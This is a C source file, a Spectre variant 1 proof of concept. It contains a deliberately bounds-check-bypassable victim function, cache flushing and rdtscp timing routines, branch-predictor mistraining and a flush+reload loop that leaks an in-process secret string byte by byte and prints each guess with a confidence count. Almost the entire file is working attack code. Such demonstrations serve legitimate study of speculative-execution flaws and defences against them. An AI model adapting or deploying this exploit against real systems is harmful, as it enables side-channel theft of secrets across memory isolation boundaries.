/*********************************************************************
*
* Spectre PoC
*
**********************************************************************/

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include "fcntl.h"
#include "sched.h"
#include "pthread.h"
#include "unistd.h"
#include "inttypes.h"


/********************************************************************
Victim code.
********************************************************************/
unsigned int array1_size = 16;
uint8_t unused1[64];
uint8_t array1[16] = {
  1,
  2,
  3,
  4,
  5,
  6,
  7,
  8,
  9,
  10,
  11,
  12,
  13,
  14,
  15,
  16
};
uint8_t unused2[64];
uint8_t array2[256 * 512]={0};

char * secret = "abcdefghijklmnopq.";

uint8_t temp = 0;



void victim_function(size_t x){
  if (x < array1_size) {
    temp &= array2[array1[x] * 512];
  }
}


static inline uint32_t rdtscp()
{
    uint32_t rv;
    asm volatile("rdtscp" : "=a"(rv)::"edx", "ecx");
    return rv;

}


static inline uint64_t rdtscp64()
{
    uint32_t low, high;
    asm volatile("rdtscp" : "=a" (low), "=d" (high) :: "ecx");
    return (((uint64_t)high) << 32) | low;
}


/********************************************************************
Analysis code
********************************************************************/


/*
 * the code for flushing an address from cache to memory
 * the input is a pointer
 */
static inline void flush(void* addr)
{
    asm volatile("clflush 0(%0)": : "r" (addr):);
}



/*
 * the code for loading an address and timing the load
 * the output of this function is the time in CPU cycles
 * the input is a pointer
 */
static inline uint32_t memaccesstime(void *v) {
  uint32_t rv;
  asm volatile("mfence\n"
               "lfence\n"
               "rdtscp\n"
               "mov %%eax, %%esi\n"
               "mov (%1), %%eax\n"
               "rdtscp\n"
               "sub %%esi, %%eax\n"
               : "=&a"(rv)
               : "r"(v)
               : "ecx", "edx", "esi");
  return rv;
}

/********************************************************************
Main attack code
********************************************************************/

void readMemoryByte(size_t malicious_x, int histogram[256]) {
    int tries, i, j, mix_i;
    size_t training_x, x;
    uint32_t time1;

    for (tries = 0; tries < 100; tries++) {
        // Step 1: Flush array2
        for (i = 0; i < 256; i++)
            flush(&array2[i * 512]);
        asm volatile("lfence\nmfence\n");

        training_x = tries % array1_size;

        // Step 2: Mistrain branch predictor and call victim_function
        for (j = 49; j >= 0; j--) {
            // Flush array1_size multiple times to slow down branch resolution
            flush(&array1_size);
            flush(&array1_size);
            flush(&array1_size);
            asm volatile("mfence\nlfence\n");

            // Delay to ensure flush completes and create timing window
            for (volatile int z = 0; z < 80; z++) {}

            // Training pattern: use training_x for j%7!=0, malicious_x for j%7==0
            x = ((j % 7) - 1) & ~0xFFFF;
            x = (x | (x >> 16));
            x = training_x ^ (x & (malicious_x ^ training_x));

            victim_function(x);
        }

        // Step 3: Reload array2 and determine the secret value
        uint32_t min_time = 999999;
        int min_idx = -1;

        for (i = 0; i < 256; i++) {
            // Use scrambled order to avoid prefetcher effects
            mix_i = ((i * 167) + 13) & 255;

            // Skip values that could be from array1
            if (mix_i >= 1 && mix_i <= 16) continue;

            time1 = memaccesstime(&array2[mix_i * 512]);

            if (time1 < min_time) {
                min_time = time1;
                min_idx = mix_i;
            }
        }

        // Only record if timing is significantly fast (in cache)
        if (min_time < 100 && min_idx != -1) {
            histogram[min_idx]++;
        }
    }
}

int main()
{
    // Initialize array2 to ensure it's in a known state
    for (int i = 0; i < sizeof(array2); i++) {
        array2[i] = 1;
    }

    printf("Reading secret string:\n");

    // Calculate offset from array1 to secret (without directly reading secret)
    // We only use the address of secret, not its content
    size_t offset = (size_t)((uint8_t*)secret - array1);

    int len = 18; // Length known from the declaration

    for (int idx = 0; idx < len; idx++) {
        int histogram[256];
        int i;
        for (i = 0; i < 256; i++) histogram[i] = 0;

        size_t malicious_x = offset + idx;
        readMemoryByte(malicious_x, histogram);

        // Find the most frequent guess
        int max = 0;
        int guess = 0;
        int temp;
        for (i = 0; i < 256; i++) {
            temp = histogram[i];
            guess = (temp > max) * i + (temp <= max) * guess;
            max = (temp > max) * temp + (temp <= max) * max;
        }

        // Display the guessed character
        char display = '?';
        if (guess >= 32 && guess <= 126) {
            display = (char)guess;
        }

        // Success rate is the confidence (count of most frequent value)
        printf("byte %d: %c = 0x%02x, success rate %d/100 (%d%%)\n",
               idx, display, guess, max, max);
    }

    return 0;
}
